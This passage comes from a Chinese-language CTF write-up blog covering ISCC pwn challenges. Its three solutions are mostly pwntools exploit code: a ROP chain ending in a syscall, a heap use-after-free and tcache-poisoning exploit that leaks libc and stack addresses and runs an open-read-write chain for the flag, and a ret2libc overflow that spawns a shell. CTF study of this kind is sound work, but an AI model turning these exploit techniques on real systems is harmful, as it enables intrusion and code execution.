; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004012d3</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&quot;./curious.curious&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;182.92.237.102&quot;</span>,<span class="number">10031</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./curious.curious&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">b&#x27;oh1yes&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="unheap"><a href="#unheap" class="headerlink" title="unheap"></a>unheap</h2><p>这绝对是一道堆题，且开启了沙盒，禁用execve。</p><p><img src="/2024/05/17/isccwp/image-20240523014659905.png" alt="image-20240523014659905"></p><p><img src="/2024/05/17/isccwp/image-20240523010134115.png" alt="image-20240523010134115"></p><p>有uaf漏洞</p><p><img src="/2024/05/17/isccwp/image-20240523010230209.png" alt="image-20240523010230209"></p><p>经测试，远端glibc版本大概在2.27及以上，2.31以下</p><p><img src="/2024/05/17/isccwp/image-20240523012558982.png" alt="image-20240523012558982"></p><p>​所以利用uaf直接double free将堆块申请到top chunk。随后释放top chunk到unsort用来leak libc。</p><p>随后控制tcache bins将堆申请到environ泄露栈地址，打栈上的orw。</p><p>exploit:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">sh=remote(<span class="string">&#x27;182.92.237.102&#x27;</span>,<span class="number">10030</span>)</span><br><span class="line"><span class="comment">#FILENAME=&#x27;./unheap&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(FILENAME)</span></span><br><span class="line"><span class="comment">#elf=ELF(FILENAME)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;../libc-2.27.so&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">Size,Content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;size&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(Size),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;content&#x27;</span>)</span><br><span class="line">    sh.send(Content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,Content</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;data&#x27;</span>)</span><br><span class="line">    sh.send(Content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">heap_add=u64(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase=heap_add-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heapbase &#x27;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">chunk_0=heapbase+<span class="number">0x260</span>+<span class="number">0x10</span></span><br><span class="line">create(<span class="number">0x18</span>,p64(heapbase+<span class="number">0x10</span>))<span class="comment">#1,0</span></span><br><span class="line">create(<span class="number">0x18</span>)<span class="comment">#2,1,0</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#3,tache</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>)+<span class="string">b&#x27;\x07&#x27;</span>*<span class="number">8</span></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_add=u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=libc_add-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&#x27;libcbase &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;libc_addr &#x27;</span>+<span class="built_in">hex</span>(libc_add))</span><br><span class="line"></span><br><span class="line">env=libcbase+libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>)+p64(env)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;\x18&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">stack_add=u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;stack_add &#x27;</span>+<span class="built_in">hex</span>(stack_add))</span><br><span class="line"></span><br><span class="line">ret_add=stack_add-<span class="number">0x110</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xb0</span>)+p64(ret_add)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b* $rebase(0xCEF)&#x27;)</span></span><br><span class="line">rdi_ret=libcbase+<span class="number">0x000000000002164f</span></span><br><span class="line">rsi_ret=libcbase+<span class="number">0x0000000000023a6a</span></span><br><span class="line">rdx_ret=libcbase+<span class="number">0x0000000000001b96</span></span><br><span class="line">ret=libcbase+<span class="number">0x00000000000008aa</span></span><br><span class="line">mprotect=libcbase+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">puts=libcbase+libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">str_bin_sh=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=p64(ret)*6+p64(rdi_ret)+p64(str_bin_sh)+p64(puts)#test</span></span><br><span class="line">payload=p64(ret)*<span class="number">6</span></span><br><span class="line">length=(<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(length))</span><br><span class="line">orw=p64(rdi_ret)+p64(ret_add-(ret_add&amp;<span class="number">0xfff</span>))+p64(rsi_ret)+p64(<span class="number">0x5000</span>)</span><br><span class="line">orw+=p64(rdx_ret)+p64(<span class="number">7</span>)+p64(mprotect)+p64(ret_add+<span class="number">0x8</span>*(<span class="number">8</span>)+length)+asm(shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line"></span><br><span class="line">openadd=libcbase+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">writeadd=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">readadd=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_add=ret_add+length+<span class="number">8</span>*<span class="number">15</span></span><br><span class="line">orw_rop  = p64(rdi_ret) + p64(flag_add) + p64(rsi_ret) + p64(<span class="number">0</span>)+ p64(openadd)</span><br><span class="line">orw_rop += p64(rdi_ret) + p64(<span class="number">3</span>) + p64(rsi_ret) + p64(flag_add) + p64(rdx_ret) + p64(<span class="number">0x100</span>) + p64(readadd)</span><br><span class="line">orw_rop += p64(rdi_ret) + p64(<span class="number">1</span>)+ p64(writeadd)</span><br><span class="line">orw_rop += <span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line">payload+=orw_rop</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">create(<span class="number">0x100</span>-<span class="number">0x8</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/05/17/isccwp/image-20240523013817189.png" alt="image-20240523013817189"></p><h2 id="great"><a href="#great" class="headerlink" title="great"></a>great</h2><p>查看保护，并拖入IDA反编译</p><p><img src="/2024/05/17/isccwp/image-20240523015629026.png" alt="image-20240523015629026"></p><p><img src="/2024/05/17/isccwp/image-20240523015537644.png" alt="image-20240523015537644"></p><p>发现栈溢出，直接打ret2libc</p><p>需要注意的是，进入此函数之前要经过两次验证</p><p><img src="/2024/05/17/isccwp/image-20240523020311753.png" alt="image-20240523020311753"></p><p><img src="/2024/05/17/isccwp/image-20240523020331163.png" alt="image-20240523020331163"></p><p>exploit:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)</span><br><span class="line">sh = remote(&#x27;182.92.237.102&#x27;,10014)</span><br><span class="line">elf = ELF(&quot;./great&quot;)</span><br><span class="line">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">sh.sendlineafter(&quot;Do you enjoy ISCC?&quot;,b&#x27;yes&#x27;)</span><br><span class="line">sh.sendlineafter(&quot;Then I will show you something great.&quot;,b&#x27;OK&#x27;)</span><br><span class="line">puts_plt = 0x8048490</span><br><span class="line">puts_got = elf.got[&quot;puts&quot;]</span><br><span class="line">great = 0x08048624</span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(puts_plt) + p32(great) + p32(puts_got)</span><br><span class="line">sh.recvuntil(&quot;Here it is!&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">puts_addr = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">system = puts_addr -0x5f150 + 0x3a950</span><br><span class="line">binsh = puts_addr - 0x5f150+ 0x15912b</span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(system) + p32(0) + p32(binsh)</span><br><span class="line">sh.sendlineafter(&quot;Here it is!&quot;,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/05/17/isccwp/image-20240523020021686-171722933132510.png" alt="image-20240523020021686"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> iscc wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
